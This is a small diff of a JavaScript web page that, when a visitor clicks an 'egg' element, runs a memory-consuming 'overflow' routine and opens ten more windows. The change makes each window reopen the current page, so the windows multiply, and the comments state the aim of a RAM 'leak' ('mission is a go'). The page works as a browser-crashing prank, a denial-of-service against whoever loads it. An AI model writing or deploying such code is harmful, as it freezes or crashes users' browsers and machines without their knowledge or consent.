@@ -56,7 +56,7 @@ window.onload = function () {
   // another is opened to further continue the ram "leak"
   var openTabs = function openTabs(numTabs) {
     for (var i = 0; i < numTabs; i++) {
-      window.open("html/index.html", "egg", "inner-width: 200");
+      window.open("".concat(window.location.href), "egg", "inner-width: 200");
     }
   };
 
@@ -71,8 +71,8 @@ window.onload = function () {
 
   // run the "fixedOverflow" function when the egg is clicked
   document.getElementById("egg").addEventListener("click", function () {
-    openTabs(10); // open more tabs to run the process
     fixedOverflow(amount); // "overflow"
+    openTabs(10); // open more tabs to run the process
     console.log("mission is a go... hopefully, lol");
   });
 
